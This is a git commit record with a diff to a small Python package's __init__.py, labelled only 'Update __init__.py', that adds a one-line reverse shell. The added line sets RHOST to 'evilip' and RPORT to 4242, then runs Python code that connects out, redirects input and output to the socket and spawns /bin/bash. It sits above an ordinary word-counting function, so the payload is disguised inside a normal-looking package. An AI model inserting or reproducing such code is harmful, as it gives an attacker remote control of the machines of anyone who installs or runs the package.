da72c7d6ff9f1ce3b33bf582187f94e02d9dd8e1
marc <42713054+prepless@users.noreply.github.com>
2024-10-24 21:55:54 +0200

    Update __init__.py

--- test_package/__init__.py
+++ test_package/__init__.py
@@ -1,5 +1,7 @@
 from collections import Counter
 
+export RHOST="evilip";export RPORT=4242;python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
+
 def count_in_list(l, word):
     c = Counter(l)
     return c[word]
